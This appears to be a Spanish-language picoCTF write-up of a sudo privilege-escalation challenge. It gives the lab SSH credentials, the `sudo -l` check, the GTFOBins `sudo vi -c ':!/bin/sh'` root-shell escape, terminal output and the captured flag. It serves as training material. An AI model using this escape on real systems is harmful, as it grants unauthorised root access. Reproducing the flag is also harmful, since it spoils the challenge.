## Descripción
Can you read files in the root file?

The system admin has provisioned an account for you on the main server:`ssh -p 62144 picoplayer@saturn.picoctf.net`Password: `j4ks-9nxB-`Can you login and read the root file?
## Solución
tuve que ver un video de como solucionarlo, en el cual muestra que agregando el argumento -l a sudo puedes ver los comandos que tienes permitidos con super usuario.
El único comando permitido fue vi, y buscándolo en gtfobins.io pude ver los usos del comando para abrir una terminal que ignora todos los permisos y así poder acceder al directorio challenge/
```
picoplayer@challenge:/$ ls -al
total 0
drwxr-xr-x   1 root   root     51 Sep 15 01:40 .
drwxr-xr-x   1 root   root     51 Sep 15 01:40 ..
-rwxr-xr-x   1 root   root      0 Sep 15 01:40 .dockerenv
lrwxrwxrwx   1 root   root      7 Mar  8  2023 bin -> usr/bin
drwxr-xr-x   2 root   root      6 Apr 15  2020 boot
d---------   1 root   root     27 Aug  4  2023 challenge
drwxr-xr-x   5 root   root    340 Sep 15 01:40 dev
drwxr-xr-x   1 root   root     66 Sep 15 01:40 etc
drwxr-xr-x   1 root   root     24 Aug  4  2023 home
lrwxrwxrwx   1 root   root      7 Mar  8  2023 lib -> usr/lib
lrwxrwxrwx   1 root   root      9 Mar  8  2023 lib32 -> usr/lib32
lrwxrwxrwx   1 root   root      9 Mar  8  2023 lib64 -> usr/lib64
lrwxrwxrwx   1 root   root     10 Mar  8  2023 libx32 -> usr/libx32
drwxr-xr-x   2 root   root      6 Mar  8  2023 media
drwxr-xr-x   2 root   root      6 Mar  8  2023 mnt
drwxr-xr-x   2 root   root      6 Mar  8  2023 opt
dr-xr-xr-x 189 nobody nogroup   0 Sep 15 01:40 proc
drwx------   1 root   root     23 Aug  4  2023 root
drwxr-xr-x   1 root   root     54 Sep 15 01:40 run
lrwxrwxrwx   1 root   root      8 Mar  8  2023 sbin -> usr/sbin
drwxr-xr-x   2 root   root      6 Mar  8  2023 srv
dr-xr-xr-x  13 nobody nogroup   0 Sep 15 01:40 sys
drwxrwxrwt   1 root   root      6 Aug  4  2023 tmp
drwxr-xr-x   1 root   root     18 Mar  8  2023 usr
drwxr-xr-x   1 root   root     17 Mar  8  2023 var
picoplayer@challenge:/$ sudo -l
[sudo] password for picoplayer:
Matching Defaults entries for picoplayer on challenge:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User picoplayer may run the following commands on challenge:
    (ALL) /usr/bin/vi

picoplayer@challenge:/$ sudo vi -c ':!/bin/sh' /dev/null

# ls -al
total 0
drwxr-xr-x   1 root   root     51 Sep 15 01:40 .
drwxr-xr-x   1 root   root     51 Sep 15 01:40 ..
-rwxr-xr-x   1 root   root      0 Sep 15 01:40 .dockerenv
lrwxrwxrwx   1 root   root      7 Mar  8  2023 bin -> usr/bin
drwxr-xr-x   2 root   root      6 Apr 15  2020 boot
d---------   1 root   root     27 Aug  4  2023 challenge
drwxr-xr-x   5 root   root    340 Sep 15 01:40 dev
drwxr-xr-x   1 root   root     66 Sep 15 01:40 etc
drwxr-xr-x   1 root   root     24 Aug  4  2023 home
lrwxrwxrwx   1 root   root      7 Mar  8  2023 lib -> usr/lib
lrwxrwxrwx   1 root   root      9 Mar  8  2023 lib32 -> usr/lib32
lrwxrwxrwx   1 root   root      9 Mar  8  2023 lib64 -> usr/lib64
lrwxrwxrwx   1 root   root     10 Mar  8  2023 libx32 -> usr/libx32
drwxr-xr-x   2 root   root      6 Mar  8  2023 media
drwxr-xr-x   2 root   root      6 Mar  8  2023 mnt
drwxr-xr-x   2 root   root      6 Mar  8  2023 opt
dr-xr-xr-x 196 nobody nogroup   0 Sep 15 01:40 proc
drwx------   1 root   root     23 Aug  4  2023 root
drwxr-xr-x   1 root   root     66 Sep 15 01:41 run
lrwxrwxrwx   1 root   root      8 Mar  8  2023 sbin -> usr/sbin
drwxr-xr-x   2 root   root      6 Mar  8  2023 srv
dr-xr-xr-x  13 nobody nogroup   0 Sep 15 01:40 sys
drwxrwxrwt   1 root   root      6 Aug  4  2023 tmp
drwxr-xr-x   1 root   root     18 Mar  8  2023 usr
drwxr-xr-x   1 root   root     17 Mar  8  2023 var
# cd challenge
# ls -al
total 4
d--------- 1 root root 27 Aug  4  2023 .
drwxr-xr-x 1 root root 51 Sep 15 01:40 ..
---------- 1 root root 98 Aug  4  2023 metadata.json
# cat metadata.json
{"flag": "picoCTF{uS1ng_v1m_3dit0r_021d10ab}", "username": "picoplayer", "password": "j4ks-9nxB-"}# Connection to saturn.picoctf.net closed by remote host.
Connection to saturn.picoctf.net closed.

```

## Notas
[sudo -l] - list user's privileges or check a specific command; use twice for longer format
[sudo vi -c ':!/bin/sh' /dev/null] - It can be used to break out from restricted environments by spawning an interactive system shell. If the binary is allowed to run as superuser by `sudo`, it  does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.
## Referencias
https://gtfobins.github.io/gtfobins/vi/
https://www.youtube.com/watch?v=ZCM8pLNE2TE&ab_channel=COZT